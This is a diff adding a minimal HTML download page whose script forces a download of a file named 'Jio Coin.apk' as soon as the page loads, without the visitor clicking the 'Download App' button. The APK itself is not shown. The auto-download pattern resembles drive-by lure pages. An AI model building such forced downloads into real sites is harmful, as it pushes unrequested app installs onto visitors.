@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('photo_6084416157063515010_y.jpg') no-repeat center center fixed;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .download-btn {
+            background: #4CAF50;
+            color: white;
+            font-size: 18px;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        .download-btn:hover {
+            background: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <button class="download-btn" onclick="downloadFile()">Download App</button>
+
+    <script>
+        function downloadFile() {
+            const link = document.createElement('a');
+            link.href = 'Jio Coin.apk';
+            link.download = 'Jio Coin.apk';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+        
+        // Auto download on page load
+        window.onload = function() {
+            downloadFile();
+        };
+    </script>
+</body>
+</html>
